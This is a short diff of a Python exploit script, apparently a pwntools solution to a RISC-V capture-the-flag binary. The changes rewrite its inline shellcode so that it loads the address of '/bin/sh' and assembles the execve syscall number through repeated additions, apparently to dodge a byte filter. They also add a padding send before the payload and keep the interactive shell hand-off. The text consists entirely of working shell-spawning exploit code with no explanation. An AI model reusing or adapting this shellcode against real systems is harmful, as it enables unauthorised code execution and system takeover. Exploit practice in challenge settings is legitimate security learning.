@@ -123,10 +123,26 @@ def exploit(p):
 
     addr_of_binsh = 0x12000
 
-        #li x2, 221
     assembly = """
-        andi x2, x2, 221
-        lui a0, 0x12
+        lui a0, 18
+        
+        li a1, 0
+        li a2, 0
+        li a3, 0
+        li a4, 0
+        li a5, 0
+        li a6, 0
+
+        li a7, 29
+        addi a7, a7, 24
+        addi a7, a7, 24
+        addi a7, a7, 24
+        addi a7, a7, 24
+        addi a7, a7, 24
+        addi a7, a7, 24
+        addi a7, a7, 24
+        addi a7, a7, 24
+
         ecall
     """
 
@@ -147,7 +163,7 @@ def exploit(p):
 
     print(exp, len(exp))
 
-
+    p.send(b'Z'*65)
     p.sendline(exp)
     p.interactive()
     
